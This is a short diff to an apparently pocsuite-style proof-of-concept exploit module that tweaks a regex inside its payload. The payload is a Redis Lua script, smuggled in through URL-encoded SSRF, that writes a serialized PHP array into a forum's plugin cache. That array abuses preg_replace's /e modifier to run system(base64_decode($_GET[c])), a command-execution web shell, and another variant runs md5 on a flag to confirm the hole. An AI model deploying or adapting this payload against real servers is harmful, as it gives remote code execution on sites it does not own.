@@ -39,7 +39,7 @@ class TestPOC(POCBase):
                    'for i,v in ipairs(t) do redis.call(\'set\',v,'
                    '\'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";'
                    'a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";'
-                   's:5:\\\"/.*/e\\\";}s:7:\\\"replace\\\";'
+                   's:5:\\\"/^./e\\\";}s:7:\\\"replace\\\";'
                    'a:1:{s:7:\\\"plugins\\\";s:32:\\\"system(base64_decode($_GET[c]));\\\";}}}'
                    's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'
                    ' end;return 1;" 0 %250D%250Aquit')
@@ -88,7 +88,7 @@ class TestPOC(POCBase):
                    'for i,v in ipairs(t) do redis.call(\'set\',v,'
                    '\'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";'
                    'a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";'
-                   's:5:\\\"/.*/e\\\";}s:7:\\\"replace\\\";'
+                   's:5:\\\"/^./e\\\";}s:7:\\\"replace\\\";'
                    'a:1:{s:7:\\\"plugins\\\";s:14:\\\"md5(' + flag + ');\\\";}}}'
                    's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'
                    ' end;return 1;" 0 %250D%250Aquit')
